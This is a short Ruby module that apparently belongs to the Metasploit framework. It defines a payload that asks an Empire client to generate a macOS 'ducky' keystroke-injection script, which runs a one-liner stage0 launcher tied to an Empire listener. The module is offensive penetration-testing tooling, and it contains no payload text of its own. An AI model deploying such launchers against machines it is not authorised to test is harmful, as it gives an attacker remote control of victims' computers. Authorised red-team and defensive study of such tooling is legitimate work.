##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
    'Description'=> 'Generates a ducky script that runs a one-liner stage0 launcher for Empire'
    ))
  end

  def stagerGenerator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'osx/ducky')
    return @stagerCode
  end
end
